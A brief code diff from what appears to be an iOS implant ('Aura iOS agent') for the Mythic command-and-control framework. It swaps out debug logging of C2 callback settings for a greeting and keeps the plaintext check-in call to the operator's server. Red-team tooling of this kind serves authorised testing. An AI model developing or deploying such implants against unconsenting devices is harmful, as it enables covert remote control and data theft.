@@ -18,12 +18,7 @@ int main(int argc, const char * argv[]) {
         signal(SIGINT, handleSignal);
         signal(SIGHUP, handleSignal);
 
-        /// Print out the stamped C2 configuration data from Mythic
-        NSLog(@"C2 Configuration Data:");
-        NSLog(@"Callback Host: %@", [HTTPC2Config callbackHost]);
-        NSLog(@"Callback Port: %ld", (long)[HTTPC2Config callbackPort]);
-        NSLog(@"Headers: %@", [HTTPC2Config headers]);
-        NSLog(@"Payload UUID: %@", [HTTPC2Config payloadUUID]);
+        NSLog(@"👋 Hello from the Aura iOS agent!");
 
         /// Perform the HTTP plaintext check-in
         [C2CheckIn performPlaintextCheckin];
